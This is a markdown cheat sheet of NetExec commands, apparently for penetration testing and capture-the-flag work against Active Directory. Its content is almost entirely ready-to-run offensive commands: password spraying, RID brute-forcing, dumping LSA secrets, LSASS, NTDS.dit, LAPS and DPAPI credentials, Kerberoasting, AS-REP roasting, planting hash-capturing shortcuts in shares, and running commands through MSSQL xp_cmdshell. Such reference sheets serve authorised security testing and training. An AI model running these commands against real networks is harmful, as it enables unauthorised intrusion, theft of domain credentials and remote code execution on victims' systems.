______________________________________________________________________

title: netexec
tags:

- networking
- active-directory

______________________________________________________________________

## netexec

<!-- TOC --><a name="smb"></a>

### smb

#### initial enumeration

```sh
netexec smb target
```

#### null authentication

```sh
netexec smb target -u '' -p ''
```

#### guest authentication

```sh
netexec smb target -u 'guest' -p ''
```

#### list shares

```sh
netexec smb target -u '' -p '' --shares
```

```sh
netexec smb target -u username -p password --shares
```

#### list usernames

```sh
netexec smb target -u '' -p '' --users
```

```sh
netexec smb target -u '' -p '' --rid-brute
```

```sh
netexec smb target -u username -p password --users
```

#### local authentication

```sh
netexec smb target -u username -p password --local-auth
```

#### using kerberos

```sh
netexec smb target -u username -p password -k
```

#### password spray

```sh
netexec smb target -u users.txt -p password --continue-on-success
```

```sh
netexec smb target -u usernames.txt -p passwords.txt --no-bruteforce --continue-on-success
```

```sh
netexec ssh target -u username -p password --continue-on-success
```

#### all in one

```sh
netexec smb target -u username -p password --groups --local-groups --loggedon-users --rid-brute --sessions --users --shares --pass-pol
```

#### spider_plus module

```sh
netexec smb target -u username -p password -M spider_plus
```

```sh
netexec smb target -u username -p password -k --get-file target_file output_file --share sharename
```

#### dump a specific file

```sh
netexec smb target -u username -p password -k --get-file target_file output_file --share sharename
```

#### dump lsa secrets

```sh
netexec smb target -u username -p password --local-auth --lsa
```

#### group policy preferences

```sh
netexec smb target -u username -p password -M gpp_password
```

#### dump laps v1 and v2 password

```sh
netexec smb target -u username -p password --laps
```

#### dump dpapi credentials

```sh
netexec smb target -u username -p password --laps --dpapi
```

#### dump ntds.dit

```sh
netexec smb target -u username -p password --ntds
```

#### webdav - checks whether the webclient service is running on the target

```sh
netexec smb ip -u username -p password -M webdav 
```

#### veeam - extracts credentials from local veeam sql database

```sh
netexec smb target -u username -p password -M veeam
```

#### slinky - creates windows shortcuts with the icon attribute containing a UNC path to the specified SMB server in all shares with write permissions

```sh
netexec smb ip -u username -p password -M slinky 
```

#### ntdsutil - dump ntds with ntdsutil

```sh
netexec smb ip -u username -p password -M ntdsutil
```

#### dump lsass

```sh
netexec smb target -u username -p password -M lsassy
```

#### retrieve msol account password

```sh
netexec smb target -u username -p password -M msol
```

<!-- TOC --><a name="ftp"></a>

### ftp

#### list folders and files

```sh
netexec ftp target -u username -p password --ls
```

#### list files inside a folder

```sh
netexec ftp target -u username -p password --ls folder_name
```

#### retrieve a specific file

```sh
netexec ftp target -u username -p password --ls folder_name --get file_name
```

<!-- TOC --><a name="ldap"></a>

### ldap

#### enumerate users using ldap

```sh
netexec ldap target -u '' -p '' --users
```

#### all in one

```sh
netexec ldap target -u username -p password --trusted-for-delegation  --password-not-required --admin-count --users --groups
```

#### kerberoast

```sh
netexec ldap target -u username -p password --kerberoasting kerb.txt
```

#### asreproast

```sh
netexec ldap target -u username -p password --asreproast asrep.txt
```

#### gmsa

```sh
netexec ldap target -u username -p password --gmsa-convert-id id
```

```sh
netexec ldap domain -u username -p password --gmsa-decrypt-lsa gmsa_account
```

#### check the machine account quota

```sh
netexec ldap target -u username -p password -M maq
```

#### adcs enumeration

```sh
netexec ldap target -u username -p password -M adcs
```

<!-- TOC --><a name="bloodhound"></a>

### bloodhound

```sh
netexec ldap target -u username -p password --bloodhound -ns ip --collection All
```

<!-- TOC --><a name="mssql"></a>

### mssql

- authentication

```sh
netexec mssql target -u username -p password
```

#### execute commands using xp_cmdshell

```sh
netexec mssql target -u username -p password -x command_to_execute
```

> -X for powershell and -x for cmd

#### get a file

```sh
netexec mssql target -u username -p password --get-file output_file target_file
```

source: https://github.com/seriotonctf/cme-nxc-cheat-sheet
